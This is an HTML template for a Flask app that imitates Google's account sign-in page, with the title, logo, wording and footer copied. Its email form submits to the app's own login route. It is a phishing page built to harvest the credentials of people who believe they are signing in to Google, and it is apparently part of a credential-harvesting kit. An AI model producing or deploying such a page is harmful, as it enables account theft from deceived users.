<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='static/style.css') }}">
    <link rel="icon" href="{{ url_for('static', filename='assets/google_g_48dp.png') }}" type="image/png">
</head>
<body>
    <div class="container">
        <div class="card">
            <img src="{{ url_for('static', filename='assets/google_g_48dp.png') }}" alt="Google" class="google-logo">
            <h1>Sign in</h1>
            <p class="subtitle">Use your Google Account</p>

            <form action="{{ url_for('login') }}" method="POST">
                <div class="input-group">
                    <input type="email" id="username" name="username" placeholder="Email or phone" required autofocus>
                    <label for="username">Email or phone</label>
                </div>
                <a href="#" class="forgot-link">Forgot email?</a>

                <p class="info-text">Not your computer? Use a Private Window to sign in. <a href="#" class="learn-more">Learn more about using Guest mode</a></p>

                <div class="button-group">
                    <a href="#" class="create-account-link">Create account</a>
                    <button type="submit" class="button primary">Next</button>
                </div>
            </form>
        </div>

        <div class="footer">
            <div class="dropdown">
                <span>English (United States)</span> &#9662;
            </div>
            <div class="footer-links">
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </div>
        </div>
    </div>
</body>
</html>
